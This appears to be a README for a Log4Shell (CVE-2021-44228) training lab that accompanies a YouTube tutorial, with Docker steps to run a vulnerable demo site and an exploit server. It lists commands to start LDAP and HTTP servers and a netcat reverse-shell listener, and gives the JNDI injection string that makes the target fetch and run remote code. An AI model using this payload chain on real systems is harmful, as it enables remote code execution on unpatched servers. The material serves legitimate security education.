# log4shell
## Hello Friend
This repository hosts the code behind the [Youtube-Video "Hacking with Log4j Vulnerability (Log4Shell) - Mr. Robot Tribute"](https://www.youtube.com/watch?v=Cj1hY7WtvK8), covering the [log4shell](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) vulnerability.

## Usage
### Docker
Either download the docker hosting the exxville group webiste and the exploit server
```
docker pull bughunterlabs/log4shell:exxville-group-website
docker pull bughunterlabs/log4shell:exploit-server
```
Or build the docker containers by yourself
```
cd exxville-group-website; bash build.sh
cd exploit-server; bash build.sh
```
### ExxVille Group Website
Run the ExxVille Group website:
```
cd exxville-group-website; bash run.sh
```
You should now be able to access the website at `localhost:8080`

### Exploit Server
Run the exploit server
```
cd exploit-server; bash run.sh
```
You can check the IP address of your running docker container with: 
```
docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' CONTAINER_NAME_OR_ID
```
Fill in the IP of the exploit server in `/exploit-server/gen_payload.py` and `exploit-server/ldap-server/ldap_server.sh`.
Generate the payload files:
```
cd /exploit-server; python3 gen_payload.py
```

Run the LDAP-server, HTTP-server and Netcat listener:
```
cd /exploit-server/ldap-server; bash ldap_server.sh
cd /exploit-server/http-server; bash http_server.sh
nc -lnvp 1337
```
Try to exploit the site with `${jndi:ldap://EXPLOIT-SERVER-IP:1389/z}`.

Good Luck and Happy Hacking

## Credits & Thanks
 * This repository was adapted from [log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc) by [kozmer](https://github.com/kozmer)
 * [Enron Email Dataset](http://www.cs.cmu.edu/~enron/)
 * [SecLists](https://github.com/danielmiessler/SecLists)